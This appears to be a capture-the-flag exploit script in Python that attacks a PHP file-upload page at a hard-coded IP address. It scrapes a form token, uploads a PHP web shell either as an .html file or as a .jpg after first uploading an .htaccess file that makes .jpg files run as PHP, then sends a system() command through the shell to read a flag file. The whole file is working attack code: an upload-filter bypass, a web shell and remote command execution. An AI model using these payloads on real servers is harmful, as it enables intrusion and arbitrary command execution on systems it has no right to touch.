# -*- coding: utf-8 -*-
# @Author: 0aKarmA_骅文
# @Date:   2019-06-23 23:15:09
# @Last Modified by:   0aKarmA
# @Last Modified time: 2019-06-24 09:47:41
import requests, re


def vulhtml(url):
    vul = url + "?text[]=123"
    files = {'uploaded':('0aKarmA.html', bytes("<?php @eval($_POST['1']); ?>", encoding="utf-8"), 'text/html')}
    verify = requests.get(vul)
    verify = "".join(re.findall(r'verify" value="(.*)"', verify.text))
    data = {'verify':verify, 'Upload':'Upload'}
    requests.post(vul, files=files, data=data)
    flag = requests.post(url + "uploads/" + verify + "_0aKarmA.html", data={'1':'system("cat ../include/flag");'})
    print(flag.text)

def vulhtaccess(url):
    vul = url + "?text[]=123"
    files = {'uploaded':('.htaccess', bytes("AddType application/x-httpd-php .jpg", encoding="utf-8"), 'application/octet-stream')}
    verify = requests.get(vul)
    verify = "".join(re.findall(r'verify" value="(.*)"', verify.text))
    data = {'verify':verify, 'Upload':'Upload'}
    # upload .htaccess
    requests.post(vul, files=files, data=data, proxies={'http':'http:127.0.0.1:8080'})
    # upload jpg
    files = {'uploaded':('0aKarmA.jpg', bytes("<?php @eval($_POST['1']); ?>", encoding="utf-8"), 'image/jpg')}
    verify = requests.get(vul)
    verify = "".join(re.findall(r'verify" value="(.*)"', verify.text))
    data = {'verify':verify, 'Upload':'Upload'}
    requests.post(vul, files=files, data=data)
    flag = requests.post(url + "uploads/" + verify + "_0aKarmA.jpg", data={'1':'system("cat ../include/flag");'})
    print(flag.text)


if __name__ == '__main__':
    url = "http://157.230.254.106:10000/"
    
    # vulhtml(url)
    vulhtaccess(url)